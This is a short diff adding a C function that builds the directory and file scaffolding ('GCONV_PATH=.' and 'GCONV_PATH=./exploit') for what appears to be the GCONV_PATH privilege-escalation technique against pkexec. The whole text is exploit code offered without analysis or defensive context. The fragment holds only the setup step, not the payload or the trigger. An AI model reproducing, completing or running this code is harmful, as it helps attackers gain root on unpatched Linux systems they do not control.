@@ -1,0 +1,15 @@
+void gconvpath()
+{
+	if (stat("GCONV_PATH=.", &st) < 0) {
+            if(mkdir("GCONV_PATH=.", 0777) < 0) {
+                perror("mkdir");
+		exit(0);
+            }
+        int fd = open("GCONV_PATH=./exploit", O_CREAT|O_RDWR, 0777);
+            if (fd < 0) {
+                perror("open");
+		exit(0);
+            }
+            close(fd);
+    	}
+}
